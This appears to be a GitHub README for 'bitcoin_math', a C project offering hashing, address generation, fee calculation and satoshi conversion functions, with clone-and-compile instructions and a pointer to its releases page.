# Bitcoin Math Implementation in C 🪙

![Bitcoin Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png)

Welcome to the **bitcoin_math** repository! This project offers a zero dependency implementation of Bitcoin mathematics in C. Our goal is to provide a simple and efficient way to perform Bitcoin-related calculations without the overhead of additional libraries.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Functions](#functions)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Features

- **Zero Dependency**: This implementation does not rely on any external libraries, making it lightweight and easy to integrate.
- **Efficiency**: Designed for speed, this code optimizes common Bitcoin calculations.
- **Simplicity**: Clear and concise code that is easy to read and understand.

## Installation

To get started, clone this repository to your local machine:

```bash
git clone https://github.com/Devansh589/bitcoin_math.git
```

Once cloned, navigate into the directory:

```bash
cd bitcoin_math
```

You can now compile the code using a C compiler like `gcc`:

```bash
gcc -o bitcoin_math main.c
```

## Usage

To use the Bitcoin math functions, run the compiled executable:

```bash
./bitcoin_math
```

For detailed usage instructions, please refer to the functions section below.

## Functions

This repository includes several key functions for Bitcoin mathematics:

### 1. Hashing Functions

- **SHA256**: Computes the SHA256 hash of the input data.
- **RIPEMD160**: Computes the RIPEMD160 hash of the input data.

### 2. Address Generation

- **Generate Address**: Create a Bitcoin address from a public key.
- **Validate Address**: Check if a Bitcoin address is valid.

### 3. Transaction Calculations

- **Transaction Fees**: Calculate the transaction fees based on input and output sizes.
- **Change Calculation**: Determine the change to return after a transaction.

### 4. Conversion Functions

- **Satoshi to Bitcoin**: Convert satoshis to Bitcoin.
- **Bitcoin to Satoshi**: Convert Bitcoin to satoshis.

## Contributing

We welcome contributions to improve this project. If you have suggestions or want to add features, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch and open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Releases

For the latest updates and versions, please check the [Releases](https://github.com/Devansh589/bitcoin_math/releases) section. Here, you can download the latest version and execute it.

![Latest Release](https://img.shields.io/badge/Latest%20Release-v1.0.0-brightgreen)

## Acknowledgments

- Thanks to the Bitcoin community for their continuous support and innovation.
- Special thanks to the contributors who help maintain and improve this project.

## Contact

For any inquiries or suggestions, feel free to reach out via the Issues section or by creating a pull request.

---

This project aims to simplify Bitcoin math for developers and enthusiasts alike. We hope you find it useful! For the latest updates, visit our [Releases](https://github.com/Devansh589/bitcoin_math/releases) page.